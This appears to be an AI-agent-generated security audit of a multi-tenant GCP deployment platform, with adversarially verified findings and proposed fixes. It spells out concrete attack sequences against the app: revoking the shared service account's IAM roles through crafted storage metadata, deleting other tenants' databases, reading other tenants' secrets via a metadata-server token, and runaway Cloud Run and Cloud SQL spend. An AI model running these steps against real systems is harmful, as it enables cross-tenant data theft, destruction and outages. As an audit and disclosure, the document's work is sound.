E2E: `@playwright/test` and `playwright` are devDependencies but there is NO `playwright.config.*` anywhere, no file in the repo imports `@playwright/test`, and there is no `test:e2e` script. The only browser automation is three ad-hoc Python scripts (`scripts/verify_ui_177.py`, `scripts/verification/verify_alerts.py`) that hardcode `localhost:3000` and the `audit-id` mock project — not runnable in CI. Playwright is a dead ~200MB dependency.

CI: exactly three workflows, all read end-to-end. `rg 'npm test|npm run lint|eslint|playwright' .github/` → no matches. `auto-merge-jules.yml` runs `npm run build` only, then auto-approves and enables auto-merge; `cron-auto-merge.yml` merges with `--admin` every 15 minutes; `sync-lockfile.yml` pushes lockfile changes to `main`. No lint job, no test job, no security scan, no deploy job (the platform's own Cloud Run deploy is not in CI at all — only a root `Dockerfile`).

Observability: read `src/lib/logging/tracker.ts`, `src/lib/logging/parser.ts`, `src/lib/audit.ts`, `src/lib/security/index.ts`, `src/lib/config.ts`, `src/proxy.ts`, and `src/app/api/infrastructure/health/route.ts` end-to-end. 729 `console.*` calls; zero Sentry/Error Reporting/OTel/Datadog; `trackError` wired into 2 of 84 routes; `Collections.ERRORS` written once and read never.

NOT REPORTED (checked and judged too weak or belonging to another dimension): (a) `/api/infrastructure/health` requires a session and calls `listProjectsByTeam(teamId)` with no membership check — that is an IDOR for the authz reviewer, not an observability finding; there is separately no unauthenticated `/healthz` for the platform's own Cloud Run service, but Cloud Run's default TCP startup probe makes that low-impact on its own, and its 500 handler leaking `error.message` is minor. (b) `validateConfig()` (src/lib/config.ts:88) only `console.warn`s on missing `JWT_SECRET`/`GITHUB_WEBHOOK_SECRET` and never throws, so a misconfigured revision boots and 500s at runtime — real but lower impact than the eight above. (c) `decrypt()` silently returns its input when the value lacks the `enc:` prefix — checked the two consumers (`src/lib/db.ts:235` gates on `env.isEncrypted` and re-throws to fail the deploy) and concluded it is adequately mitigated. (d) The Razorpay webhook's empty `default:` case silently 200s on `payment.failed` / `subscription.cancelled` so cancellations never downgrade a tier — real, but I could not confirm from the code whether subscription-lifecycle events are actually configured on the Razorpay side, so I dropped it rather than speculate. (e) Non-constant-time `===` in `verifyPaymentSignature`/`verifyWebhookSignature` is folded into finding #3 rather than reported as a standalone timing attack, since remote HMAC timing exploitation over HTTPS is impractical; the defensible defect is the absence of any test on those functions.

NOT COVERED: I did not execute `npm test`, `npm run lint`, or `npm run build` (baseline supplied by the orchestrator). I did not evaluate assertion quality inside the 34 existing test files — several appear to run entirely under `MOCK_DB=true` against mocked GCP responses, so their real coverage of the modules they nominally test may be thinner than file count suggests, but I did not audit that claim in depth. I did not inspect Firestore security rules (no `firestore.rules` file exists in the repo — only `firestore.indexes.json` — which may itself be worth a separate look), Cloud Monitoring alert policies, or any GCP-side configuration that lives outside this repository.


## D14. Resource abuse, cost control & tenant escape  <sub>`ai-cost-abuse`</sub>

### 🔴 CRITICAL — Tenant-controlled metadata drives project-level IAM role revocation on the shared platform service account (platform-wide DoS)
- **Location:** `src/lib/gcp/remediation-utils.ts:185`
- **Category:** `tenant-escape`
- **Failure scenario:** `storage.metadata` is a free-form attacker-controlled blob: src/app/api/projects/[id]/storage/route.ts:455 merges the raw request body's metadata into the stored config with no allowlist (`metadata: { ...(storage.metadata || {}), ...(metadata || {}), secretOnly, connectionPoolerEnabled, operationName }` — note `provisioned`, `projectId` and `excessiveRoles` are NOT overridden by the tail keys, unlike in the POST handler at line 189 where `provisioned: provision` clobbers it). Attack: (1) POST /api/projects/{myProject}/storage to create any connector of type `cloud-sql-postgres` with provision:false (no GCP cost, no provisioning); (2) PATCH /api/projects/{myProject}/storage with `{storageId, metadata:{provisioned:true, iamOverprivileged:true, excessiveRoles:['roles/cloudbuild.builds.editor','roles/run.admin','roles/cloudsql.admin','roles/secretmanager.admin','roles/artifactregistry.admin','roles/iam.serviceAccountUser']}}`; (3) POST /api/projects/{myProject}/storage/{storageId}/remediate with `{"riskId":"overprivileged_service_account"}`. remediateRisk then calls revokeProjectRole() once per attacker-supplied role against `deployify-sa@<platform-gcp-project>` at the project level (src/lib/gcp/iam.ts:70 setIamPolicy). The comment at remediation-utils.ts:114 ("Ensure the Deployify service account has Project IAM Admin permissions") confirms the SA can actually perform setIamPolicy. Every other tenant's builds, Cloud Run deploys, Cloud SQL provisioning and secret access then fail platform-wide until an operator manually restores the IAM policy out-of-band.
- **Impact:** One ordinary paying (or free) customer permanently strips the shared platform service account of the roles the whole PaaS runs on — a complete, hard-to-diagnose outage for every tenant. It is also a self-inflicted-privilege attack surface: the same handler calls grantProjectRole() (line 194) and grantSecretAccess() (199-202) with the same attacker-influenced gcpProjectId.
- **Evidence:**

```ts
case 'overprivileged_service_account':
    if (storage.metadata?.provisioned) {
        const gcpProjectId = (storage.metadata?.projectId as string) || config.gcp.projectId || process.env.GCP_PROJECT_ID;
        const saName = process.env.GCP_SERVICE_ACCOUNT_NAME || 'deployify-sa';
        const saEmail = `${saName}@${gcpProjectId}.iam.gserviceaccount.com`;

        const excessiveRoles = (storage.metadata?.excessiveRoles as string[]) || ['roles/owner', 'roles/editor'];

        // 1. Revoke excessive roles
        for (const role of excessiveRoles) {
            await revokeProjectRole(gcpProjectId!, saEmail, role);
        }
```
- **Agent says it ruled out:** Grepped both remediation entry points for authorization. src/app/api/projects/[id]/storage/[storageId]/remediate/route.ts:26 calls checkProjectAccess but has NO role gate at all — even a `viewer` on any project can invoke it (contrast /api/projects/[id]/storage/route.ts:75 which does `if (access.role === 'viewer')`). src/app/api/infrastructure/remediate/route.ts:28 checks getTeamMembership but only that the caller belongs to the team owning the project; it never validates riskId or the metadata that riskId consumes. Grepped for any allowlist/validation of `excessiveRoles` or of metadata keys across src/app/api/projects/[id]/storage/route.ts — the only sanitisation is `delete metadata.providerApiKey; delete metadata.dbPassword` (line 399-402). No schema validation, no role allowlist, no admin gate anywhere.

### 🔴 CRITICAL — /api/gcp/discover DELETE lets any project owner delete any tenant's Cloud SQL / Redis / Firestore in the shared GCP project
- **Location:** `src/app/api/gcp/discover/route.ts:96`
- **Category:** `broken-object-level-authorization`
- **Failure scenario:** Authorization is checked against `projectId` (a Deployify project), but the resource actually destroyed is `resourceId` — an arbitrary GCP resource name that is never checked against `access.project.storageConfigs`. All tenants' Cloud SQL instances live in one shared GCP project: src/lib/gcp/cloudsql.ts:36 hardcodes `const gcpProjectId = config.gcp.projectId || process.env.GCP_PROJECT_ID` for createInstance and ignores any per-tenant project. Attack: create a free project (checkProjectAccess returns role 'owner' for personal projects per src/middleware/rbac.ts:24-26, satisfying the owner/admin gate at line 88), enumerate victim instance names via GET on the same route (which also has no resource-scoping — it lists every Cloud SQL/Redis/Firestore resource in the shared project, src/lib/gcp/discovery.ts:85), then `DELETE /api/gcp/discover?projectId=<my-project>&resourceId=<victim-prod-db>&resourceType=cloud-sql`. src/lib/gcp/cloudsql.ts:841 issues `DELETE https://sqladmin.googleapis.com/v1/projects/{sharedProject}/instances/{victim-prod-db}` with the platform SA token. createInstance sets `deletionProtectionEnabled: options.deletionProtectionEnabled ?? false` (cloudsql.ts:49) and the storage POST route never passes that option, so victim instances are unprotected and the delete succeeds.
- **Impact:** Irreversible destruction of another tenant's production database (and Redis instances / Firestore databases via the sibling branches at lines 99-105). The audit log written afterwards (line 116) records it under the attacker's own harmless project id.
- **Evidence:**

```ts
const resourceId = searchParams.get('resourceId');
const resourceType = searchParams.get('resourceType');
...
// 1. Verify user has access to the Deployify project
const access = await checkProjectAccess(session.user.id, projectId);
...
if (resourceType === 'cloud-sql') {
    const { deleteInstance } = await import('@/lib/gcp/cloudsql');
    await deleteInstance(resourceId, gcpProjectId || undefined);
} else if (resourceType === 'memorystore-redis') {
```
- **Agent says it ruled out:** Read the whole DELETE handler. The only authz is checkProjectAccess(session.user.id, projectId) plus an owner/admin role gate (line 88) — both evaluated on the attacker's OWN project. Grepped the handler and src/lib/gcp/discovery.ts for any comparison of resourceId against project.storageConfigs, metadata.resourceName, or a tenant name prefix: there is none. Compared with src/app/api/projects/[id]/storage/route.ts, which deletes by looking the connector up inside `project.storageConfigs` — that route is safe, this one is not.

### 🟠 HIGH — Every tenant's Cloud Run service runs as the one shared default compute SA, which is granted project-wide Cloud SQL access and accumulates secretAccessor on every tenant's secrets
- **Location:** `src/lib/gcp/cloudbuild.ts:337`
- **Category:** `tenant-isolation`
- **Failure scenario:** The Cloud Run deploy step (cloudbuild.ts:373-381) passes no `--service-account` flag — `grep -c "service-account" src/lib/gcp/cloudbuild.ts` returns 0 — so every tenant's container runs as the project's default compute SA. Meanwhile each tenant's build grants that SAME identity `roles/secretmanager.secretAccessor` on that tenant's secrets (line 337) and, project-wide, `roles/cloudsql.client` + `roles/cloudsql.instanceUser` (lines 341-342). Attack: tenant A pushes a Dockerfile whose app fetches a token from the metadata server (`http://metadata.google.internal/.../default/token`, the same endpoint src/lib/gcp/auth.ts:24 uses) and calls `GET https://secretmanager.googleapis.com/v1/projects/<shared>/secrets?...` then accesses versions. Secret ids are deterministic — src/app/api/projects/[id]/storage/route.ts:158 builds them as `deployify-${projectId}-${storageId}-conn` — and every victim secret that any tenant has ever deployed with has already had COMPUTE_SA added as accessor by that victim's own build. Tenant A reads victim connection strings and provider API keys, and separately, with project-level cloudsql.instanceUser, opens an IAM-authenticated Cloud SQL Auth Proxy connection to the victim's instance directly.
- **Impact:** Full cross-tenant compromise of database credentials, third-party provider API keys (Supabase/Neon/MongoDB Atlas), and live database contents. The blast radius grows monotonically: every tenant deploy widens the shared identity's reach.
- **Evidence:**

```ts
COMPUTE_SA="\$\${PROJECT_NUMBER}-compute@developer.gserviceaccount.com" && \
${secretResourceNames.length > 0 ? `for secret in ${secretResourceNames.join(' ')}; do \
  gcloud secrets add-iam-policy-binding $\${secret} --member="serviceAccount:$\${COMPUTE_SA}" --role="roles/secretmanager.secretAccessor" --quiet ...
gcloud projects add-iam-policy-binding ${gcpProjectId} --member="serviceAccount:$\${COMPUTE_SA}" --role="roles/cloudsql.client" --quiet ...
gcloud projects add-iam-policy-binding ${gcpProjectId} --member="serviceAccount:$\${COMPUTE_SA}" --role="roles/cloudsql.instanceUser" --quiet
```
- **Agent says it ruled out:** Grepped cloudbuild.ts for `--service-account` (0 hits) and for any per-project SA creation across src/lib/gcp/** — none exists; iam.ts only grants/revokes on a single `deployify-sa`. Checked whether the secret grants are at least per-secret: they are, but the grantee is the shared identity, which defeats the scoping. Checked whether VPC egress isolates tenants — cloudbuild.ts:382 uses `--network=${vpcNetwork} --subnet=${vpcSubnet}` from project fields, but the secret/Cloud SQL access path is IAM-based over the Google API endpoint and is unaffected by VPC settings.

### 🟠 HIGH — /api/infrastructure/health and /api/infrastructure/compliance-report accept an arbitrary teamId with no membership check
- **Location:** `src/app/api/infrastructure/health/route.ts:23`
- **Category:** `broken-access-control`
- **Failure scenario:** Any authenticated user issues `GET /api/infrastructure/health?teamId=<victim-team-id>` (or the identical pattern at src/app/api/infrastructure/compliance-report/route.ts:23). src/lib/db.ts:1078 `listProjectsByTeam` is a bare Firestore query — `.collection(PROJECTS).where('teamId','==',teamId)` — with no caller identity, so the victim team's full project list is returned and rendered into the response: project ids and names (health/route.ts:175-177), per-project regions, every storage connector's id/name/type/region, estimated monthly GCP spend and 3-month cost forecast (lines 216-220), and for compliance-report, the complete `posture.risks` list per connector (compliance-report/route.ts:45) — i.e. an enumerated map of which of the victim's databases lack SSL, lack deletion protection, or have a public IP exposed.
- **Impact:** Cross-tenant disclosure of another organisation's infrastructure inventory, cloud spend, and an itemised list of its unremediated security weaknesses — a ready-made target list for the deletion and IAM attacks above. Team ids are obtainable from any shared team context or invite flow.
- **Evidence:**

```ts
const teamId = searchParams.get('teamId');

// 1. Fetch projects for the context
let projects: Project[] = [];
if (teamId) {
    projects = await listProjectsByTeam(teamId);
} else {
    projects = await listProjectsByUser(session.user.id);
}
```
- **Agent says it ruled out:** Grepped both routes for getTeamMembership/checkProjectAccess/requireAuth: they call getSession() only (health:12, compliance-report:12) — authentication, not authorization. The sibling route src/app/api/infrastructure/remediate/route.ts:28 DOES gate the identical parameter (`const membership = await getTeamMembership(teamId, session.user.id); if (!membership) return 403`), which confirms the check is the intended pattern and simply absent from these two. Checked src/proxy.ts for an edge-layer gate on /api/infrastructure — the matcher block at line 206 contains no infrastructure or admin rule, and grep found no isAdmin/platformAdmin concept anywhere in src/lib/auth.ts or src/middleware/rbac.ts.

### 🟠 HIGH — No upper bound on Cloud Run minInstances/maxInstances — a free-tier user can pin thousands of always-on 4 vCPU instances
- **Location:** `src/app/api/projects/[id]/route.ts:201`
- **Category:** `cost-abuse`
- **Failure scenario:** `cpu` and `memory` are allowlisted (lines 185-199: cpu ∈ {1,2,4}, memory ∈ {256Mi…4Gi}) but the instance counts are only checked for `>= 0` / `> 0` and `max >= min`. A free-tier user PATCHes their project with `{"resources":{"cpu":4,"memory":"4Gi","minInstances":1000,"maxInstances":1000}}` and triggers one deploy. src/lib/gcp/cloudbuild.ts:380-381 passes those values straight through: `'--min-instances', (resources?.minInstances !== undefined ? resources.minInstances : config.cloudRun.minInstances).toString()`. Cloud Run then holds 1000 always-allocated 4 vCPU / 4 GiB instances, billed continuously at idle with zero traffic — roughly six figures per month against config.cloudRun defaults of minInstances 0 / maxInstances 10 (src/lib/config.ts:73-74). One deployment is enough, so the free tier's 20-deployments/month cap (src/lib/billing/tiers.ts:37) provides no protection whatsoever.
- **Impact:** Unbounded, immediate GCP spend on the platform's own bill from a single API call by the lowest-paying account, with no tier ceiling and no budget alert to stop it.
- **Evidence:**

```ts
if (resources.minInstances !== undefined) {
    const min = Number(resources.minInstances);
    if (isNaN(min) || min < 0) {
        return NextResponse.json(
            { error: 'Min instances must be 0 or greater.' },
...
if (resources.maxInstances !== undefined) {
    const max = Number(resources.maxInstances);
    ...
    if (isNaN(max) || max <= 0) {
```
- **Agent says it ruled out:** Read the full validation block (lines 176-229) — no maximum on either field. Grepped src/app/api/projects/[id]/route.ts and src/app/api/projects/route.ts for `tier|getUserTier|limits|Tier`: zero hits, so no plan-based ceiling is applied at update time. Grepped the whole repo for budget/quota guardrails (`checkQuota|enforceQuota|rateLimit|PLAN_LIMITS`) — the only usage gate is checkUsageLimits, which counts deployments/buildMinutes/bandwidth and is blind to instance sizing.

### 🟠 HIGH — Tenant-supplied Cloud SQL machine tier is passed straight to the GCP API with no allowlist and no per-plan instance quota
- **Location:** `src/app/api/projects/[id]/storage/route.ts:120`
- **Category:** `cost-abuse`
- **Failure scenario:** `metadata` is the unvalidated request body (line 81). src/lib/gcp/cloudsql.ts:51 uses it verbatim: `tier: options.tier || 'db-f1-micro'` inside the sqladmin instances.insert payload. A free-tier user POSTs `/api/projects/{id}/storage` with `{"type":"cloud-sql-postgres","name":"a1","provision":true,"metadata":{"tier":"db-n1-highmem-96","highAvailability":true,"pitrEnabled":true}}` and gets a 96-vCPU regional-HA Cloud SQL instance in the platform's shared GCP project — thousands of dollars a month — then loops the call with names a2, a3, … The same passthrough exists on the update path (line 417 `updateCloudSqlSettings(resourceName, { tier: metadata.tier, ... })` → cloudsql.ts:466 `if (settings.tier) updatePayload.settings.tier = settings.tier`), so existing cheap instances can also be scaled up in place.
- **Impact:** Arbitrary, unbounded Cloud SQL spend on the platform's bill from any account, plus exhaustion of the shared GCP project's per-project Cloud SQL instance quota, which denies provisioning to every other tenant.
- **Evidence:**

```ts
if (type === 'cloud-sql-postgres' && resourceName) {
    provisionResult = await createCloudSqlInstance(resourceName, 'postgres', targetRegion, {
        highAvailability: metadata?.highAvailability,
        pitrEnabled: metadata?.pitrEnabled,
        tier: metadata?.tier
    });
```
- **Agent says it ruled out:** Grepped the storage route for `tier|limit|storageConfigs.length` — the only hits are the metadata passthroughs at 120/127/417; there is no cap on how many connectors a project or user may hold. Grepped the whole of src/lib and src/app for a tier allowlist (`VALID_TIERS|allowedTiers|db-custom|db-n1`): the only occurrences are the pricing lookup table in src/lib/gcp/monitoring.ts:388-398, which is used for cost *estimation* only and falls back to db-f1-micro for unknown tiers rather than rejecting them. checkUsageLimits (src/lib/billing/caps.ts:43) is not called from any storage route — grep shows its only caller is the deploy route.

### 🟡 MEDIUM — GitHub webhook deploy path bypasses the usage-limit check enforced on manual deploys
- **Location:** `src/app/api/webhooks/github/route.ts:129`
- **Category:** `cost-abuse`
- **Failure scenario:** src/app/api/projects/[id]/deploy/route.ts:54 gates manual deploys with `const { withinLimits, limitType } = await checkUsageLimits(session.user.id); if (!withinLimits) return 403`. Neither webhook deploy path does: `grep -rn checkUsageLimits src/` returns only caps.ts, tiers.ts and the deploy route. handlePushEvent (line 129→194) and handlePullRequestEvent (line 520→590) go straight from createDeployment to submitCloudBuild. A free-tier user (limit 20 deployments / 100 build minutes per month, src/lib/billing/tiers.ts:36-38) exhausts the quota, then simply pushes empty commits to their connected repo — or opens/synchronises PRs — in a loop. Each event fires a full Cloud Build (docker pull, build, push, deploy) and a new always-billed Cloud Run revision, indefinitely.
- **Impact:** The monetisation ceiling is trivially bypassed through the platform's primary, most-used deploy trigger: uncapped Cloud Build minutes, Artifact Registry storage and Cloud Run revisions for a $0 account. The push path is also the one that most tenants use exclusively, so the enforced path is the exception, not the rule.
- **Evidence:**

```ts
// Create deployment record
    const deployment = await createDeployment({
        projectId: project.id,
        type: deploymentType,
        status: 'queued',
...
        // Submit build
        const { buildId, logUrl } = await submitCloudBuild(buildConfig, project.region);
```
- **Agent says it ruled out:** Read both webhook handlers end to end. The only gates are the HMAC signature check (line 37), `shouldAutoDeploy(project, branch)` (line 99) and `project.autoDeployPrs === false` (line 515) — all attacker-controlled or attacker-satisfiable, none tied to billing. Confirmed the deployment record is still created, so the usage counter in src/lib/billing/tracker.ts:64 keeps rising; nothing reads it to block.

### 🟡 MEDIUM — Unbounded project buildTimeout lets a tenant run 24-hour Cloud Builds that escape the build-minutes cap
- **Location:** `src/app/api/projects/[id]/route.ts:153`
- **Category:** `cost-abuse`
- **Failure scenario:** Only a `> 0` check — no maximum. The value flows unchanged into the Cloud Build request: src/lib/gcp/cloudbuild.ts:536 `timeout: buildTimeout ? `${buildTimeout}s` : '1800s'`. A tenant PATCHes `{"buildTimeout":86400}` and sets `buildCommand` to something that blocks (the command is inlined into the build step). The buildMinutes quota cannot stop this: src/lib/billing/tracker.ts:98 sums `data.buildDurationMs`, which is only written after a build completes, and checkUsageLimits runs before submission — so all 20 of a free account's monthly deployments can be launched as concurrently-running 24-hour builds before a single minute is ever counted, ~480 build-hours against a 100-minute plan limit. Combined with the webhook bypass above, the deployment count ceiling disappears too.
- **Impact:** Cloud Build compute billed to the platform at roughly 300x the tenant's paid allowance, plus occupation of the shared GCP project's concurrent-build quota, which queues and delays every other tenant's deploys.
- **Evidence:**

```ts
// Validate buildTimeout
        if (updates.buildTimeout !== undefined) {
            const timeout = Number(updates.buildTimeout);
            if (isNaN(timeout) || timeout <= 0) {
                return NextResponse.json(
                    { error: 'Build timeout must be a positive number' },
                    { status: 400, headers: securityHeaders }
                );
            }
            updates.buildTimeout = timeout;
        }
```
- **Agent says it ruled out:** Grepped every buildTimeout reference in the repo (route.ts:135/153-162, deploy route:194, webhook:187 and :583, cloudbuild.ts:33/70/515/536) — the validation block quoted above is the only check anywhere, and cloudbuild.ts applies no clamp. Confirmed checkUsageLimits (src/lib/billing/caps.ts:14-32) compares against usage computed by getMonthlyUsage, which derives buildMinutes purely from persisted completed-build durations (tracker.ts:96-104), so in-flight builds are invisible to it.

> **Coverage notes (D14):** Swept end-to-end: src/lib/gcp/{auth,iam,cloudrun,cloudsql (createInstance/deleteInstance/updateInstanceSettings),cloudbuild (full build+deploy config),networks,firewall,armor,discovery,labeling,seeding,topology,remediation-utils,security-auditor}.ts; src/app/api/infrastructure/{health,remediate,compliance-report}/route.ts; src/app/api/gcp/discover/route.ts; plus the routes those reach into — src/app/api/projects/[id]/{route,deploy}/route.ts, src/app/api/projects/[id]/storage/route.ts (POST+PATCH), src/app/api/projects/[id]/storage/[storageId]/remediate/route.ts, src/app/api/webhooks/github/route.ts, src/middleware/rbac.ts, src/lib/db.ts (listProjectsByTeam/getTeamMembership), src/lib/billing/{caps,tiers,tracker}.ts, src/lib/config.ts, src/lib/utils.ts (generateServiceName), src/proxy.ts.

Confirmed architecture facts underpinning several findings: (a) there is a SINGLE shared GCP project — every cloudrun.ts and cloudsql.ts call hardcodes `config.gcp.projectId || process.env.GCP_PROJECT_ID`, and `providerProjectId` from the tenant is only honoured in labeling.ts; (b) there is a SINGLE shared platform SA (`deployify-sa`) plus the default compute SA, with no per-tenant service account anywhere (`grep -c "service-account" src/lib/gcp/cloudbuild.ts` = 0); (c) there is NO platform-admin concept at all — grep for isAdmin/platformAdmin/superadmin across src/lib/auth.ts and src/middleware/rbac.ts returns nothing, and src/proxy.ts's matcher has no rule for /api/infrastructure or /api/gcp, so those routes are reachable by any signed-in customer; (d) the only cost guardrail in the codebase is checkUsageLimits, called from exactly one route.

Deliberately rejected as non-findings: (1) `--allow-unauthenticated` / allUsers run.invoker on tenant Cloud Run services (cloudbuild.ts:377, 420) — this is the intended product behaviour for a public PaaS, not a defect; (2) `gcpProjectId` passthrough to discoverResources GET — the platform SA has no permissions in third-party GCP projects, so cross-org enumeration fails closed (the in-shared-project enumeration it does enable is folded into the DELETE finding, which is the exploitable half); (3) resource-name injection via storage `name` → `resourceName` — the value lands in a JSON body for createInstance, and GCP's own name validation rejects path characters, so I could not construct a concrete bad outcome; (4) armor.ts / firewall.ts — all resource names are server-derived from projectSlug via `dfy-` prefixing, and srcIpRanges come from a fixed table in networks.ts, so no tenant-controlled value reaches a firewall rule.

Not covered (out of assigned scope or not reachable from the GCP surface): storage-validator.ts, monitoring.ts, external-sync.ts, migrations.ts and the ~40 per-storage sub-routes (query, import/export, clone, replica, branch, cutover, migrate-region) — several of these also provision billable GCP resources and likely share the missing-quota pattern of finding 6, but I did not read them closely enough to assert a specific defect. I also did not verify actual deployed IAM policy (no GCP access), so role-blast-radius claims are grounded strictly in the API calls the code makes.


---

# PART 5 — Adversarial verification results (session 2)

Each of the 76 deduped findings was put in front of **two independent adversarial reviewers**
whose job was to *refute* it — one on **reachability** (can a real unprivileged actor get here
in production?), one on **existing mitigation** (is there a guard the finder missed?). Both were
told to default to "refuted" when uncertain, and to read the real file rather than trust the
finder's quote.

**Result: 68 of 76 fully verified** — ✅ 64 confirmed (both reviewers upheld) · ⚖️ 3 disputed (reviewers split) · ❌ 1 refuted (false positive).
Surviving severity mix: 9 critical · 24 high · 26 medium · 8 low.

**8 findings did not finish verification** before the pause — listed at the end of this part.

> The very low refutation rate is itself a finding. It is not that the reviewers were lenient —
> spot-check them against Parts 1 and 2b, where I independently confirmed 27 of these by hand.
> The codebase genuinely has this many live defects.


## ✅ Confirmed — both reviewers upheld  <sub>(64)</sub>

### 🔴 CRITICAL — Tenant-controlled metadata drives project-level IAM role revocation on the shared platform service account (platform-wide DoS)
`ai-cost-abuse-1` · `src/lib/gcp/remediation-utils.ts:185`

**Failure scenario.** `storage.metadata` is a free-form attacker-controlled blob: src/app/api/projects/[id]/storage/route.ts:455 merges the raw request body's metadata into the stored config with no allowlist (`metadata: { ...(storage.metadata || {}), ...(metadata || {}), secretOnly, connectionPoolerEnabled, operationName }` — note `provisioned`, `projectId` and `excessiveRoles` are NOT overridden by the tail keys, unlike in the POST handler at line 189 where `provisioned: provision` clobbers it). Attack: (1) POST /api/projects/{myProject}/storage to create any connector of type `cloud-sql-postgres` with provision:false (no GCP cost, no provisioning); (2) PATCH /api/projects/{myProject}/storage with `{storageId, 

**Impact.** One ordinary paying (or free) customer permanently strips the shared platform service account of the roles the whole PaaS runs on — a complete, hard-to-diagnose outage for every tenant. It is also a self-inflicted-privilege attack surface: the same handler calls grantProjectRole() (line 194) and grantSecretAccess() (199-202) with the same attacker-influenced gcpProjectId.

**Reviewer correction.** Substance confirmed; three refinements to the finder's framing. (1) The attacker-controlled `metadata.projectId` is not the dangerous lever — pointing it at a foreign GCP project just makes getIamPolicy fail and the revoke become a swallowed no-op. The danger is the DEFAULT: gcpProjectId falls back to config.gcp.projectId and saName to 'deployify-sa', so the target is always the single shared platform SA in the platform's own GCP project. The attacker-controlled key that actually matters is `excessiveRoles` (an arbitrary revoke list), with `provisioned:true` as the gate opener. (2) The viewer angle is only half right: a viewer can indeed call the remediate route (confirmed — no role gate at src/app/api/projects/[id]/storage/[storageId]/remediate/route.ts:26-31), but a viewer cannot write the metadata, because PATCH /storage rejects viewers at src/app/api/projects/[id]/storage/route.ts:360. The realistic and sufficient actor is any signed-up tenant acting as owner of a project they created themselves. (3) Exploitation is conditional on the platform SA holding resourcemanager.projects.setIamPolicy; the code explicitly requires and documents that permission (remediation-utils.ts:114), so this is the expected production configuration rather than a mitigating factor. Severity stays critical: low-privilege authenticated actor, two HTTP requests, no victim interaction, cross-tenant destructive impact on the shared control plane requiring manual out-of-band recovery. Minimum fix: gate the remediate routes on a non-viewer/admin role AND stop trusting tenant metadata for IAM inputs — derive gcpProjectId and the role list server-side from checkLeastPrivilege() (iam.ts:163) instead of from storage.metadata, and allowlist the metadata keys accepted by PATCH so `provisioned`, `projectId` and `excessiveRoles` are server-owned. | Mechanism confirmed as reported; only the severity label and one impact nuance need adjusting. Accurate restatement: any authenticated user, acting as owner of a project they create themselves, can (1) POST /api/projects/{id}/storage with provision:false, (2) PATCH the same endpoint with metadata {provisioned:true, excessiveRoles:[...arbitrary role names...]} — the PATCH merge at route.ts:453-459 applies no allowlist and, unlike POST, does not clobber `provisioned` — then (3) POST /api/projects/{id}/storage/{storageId}/remediate with riskId "overprivileged_service_account" (that route has no role gate; even a viewer can call it). remediation-utils.ts:185-190 then calls revokeProjectRole() once per attacker-supplied role against deployify-sa@<platform-gcp-project> via cloudresourcemanager setIamPolicy, with no role denylist anywhere in iam.ts on the remediation path. Result: the shared platform service account loses arbitrary project-level roles, breaking builds, Cloud Run deploys, Cloud SQL and Secret Manager for every tenant until an operator restores the policy out-of-band; including roles/resourcemanager.projectIamAdmin in the array makes it unrecoverable through the app. Two corrections to the framing: (a) impact is availability plus IAM-policy integrity only — revoke can only delete existing bindings, so there is no data disclosure and no privilege escalation for the attacker; (b) the whole effect is conditional on the runtime SA actually holding resourcemanager.projectIamAdmin — if it does not, the fetch throws, iam.ts:84-87 catches and returns false, and remediation-utils.ts:189 discards that return, so the API reports "IAM Hardening complete" while nothing changed. Also worth noting the weaker no-PATCH variant: merely flipping provisioned:true with no excessiveRoles key triggers the hardcoded fallback ['roles/owner','roles/editor'] at line 185. Fix belongs in two places: intersect metadata.excessiveRoles against the canonical list in iam.ts:171-177 (or re-derive it server-side with checkLeastPrivilege instead of trusting stored metadata), ignore tenant-supplied metadata.projectId for the platform project, and add an owner/admin role gate to both remediation routes.

**Verified code:**

```ts
src/lib/gcp/remediation-utils.ts:179-190 (the cited line 185 is verbatim as claimed):
179            case 'overprivileged_service_account':
180                if (storage.metadata?.provisioned) {
181                    const gcpProjectId = (storage.metadata?.projectId as string) || config.gcp.projectId || process.env.GCP_PROJECT_ID;
182                    const saName = process.env.GCP_SERVICE_ACCOUNT_NAME || 'deployify-sa';
183                    const saEmail = `${saName}@${gcpProjectId}.iam.gserviceaccount.com`;
184
185                    const excessiveRoles = (storage.metadata?.excessiveRoles as string[]) || ['roles/owner', 'roles/editor'];
186
187                    // 1. Revoke excessive roles
188                    for (const role of excessiveRoles) {
189                        await revokeProjectRole(gcpProjectId!, saEmail, role);
190                    }

src/app/api/projects/[id]/storage/[storageId]/remediate/route.ts:19-31 — riskId straight from the body, checkProjectAccess with NO role gate:
19        const { id, storageId } = await params;
20        const { riskId } = a
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read remediation-utils.ts in full, both remediation HTTP entry points, the storage POST/PATCH handlers, rbac.ts, iam.ts, gcp/auth.ts, db.ts:updateProject, proxy.ts, and the UI caller. The chain holds end to end for an ordinary signed-up tenant with NODE_ENV=production and MOCK_DB unset.

REACHABILITY (each hop verified, no dead code):
1. Sign-up is open GitHub OAuth (src/app/api/auth/callback/route.ts:51 upsertUser, no allowlist). Any authenticated user can create a personal project (src/app/api/projects/route.ts:60-70 — only a session check; the role gate at :103 applies solely to teamId projects). checkProjectAccess then returns role 'owner' for a personal project (src/middleware/rbac.ts:23-26), so the actor is fully self-provisioned — no admin, no team, no victim interaction.
2. POST /api/projects/{id}/storage with provision:false creates a connector with no GCP calls. POST does clobber provisioned (route.ts:190 `provisioned: provision`), but attacker-supplied metadata keys survive (route.ts:189).
3. PATCH /api/projects/{id}/storage re-merges the raw body metadata with no allowlist (route.ts:453-458). `provisioned`, `projectId` and `excessiveRoles` are NOT in the trailing override list, so all three become attacker-controlled. The scaling branch at route.ts:404 reads the OLD `storage.metadata?.provisioned` (still false), so the PATCH makes no GCP call and cannot fail. updateProject (src/lib/db.ts:1117-1123) writes it straight through — cleanFirestoreData only strips undefined; no schema validation.
4. POST /api/projects/{id}/storage/{storageId}/remediate — the finder's authorization claim checks out: route.ts:14-31 has getSession + checkProjectAccess and NO role gate at all (contrast route.ts:75, :274, :360 in the storage route, which all gate viewers). riskId is taken verbatim from the body (line 20) and dispatched by the switch; no server-side risk-detection step gates which riskId may be submitted.
5. remediation-utils.ts:180 `if (storage.metadata?.provisioned)` is now true; line 185 reads the attacker's `excessiveRoles` array; lines 188-190 loop revokeProjectRole for each.
6. revokeProjectRole (src/lib/gcp/iam.ts:40-84) is real: the MOCK_DB short-circuit is at :45 only, so with MOCK_DB unset it does a genuine cloudresourcemanager getIamPolicy → filter member → setIamPolicy (:68) against the project. getGcpAccessToken (src/lib/gcp/auth.ts:16-22) likewise only mocks under MOCK_DB; on Cloud Run it uses the metadata server.
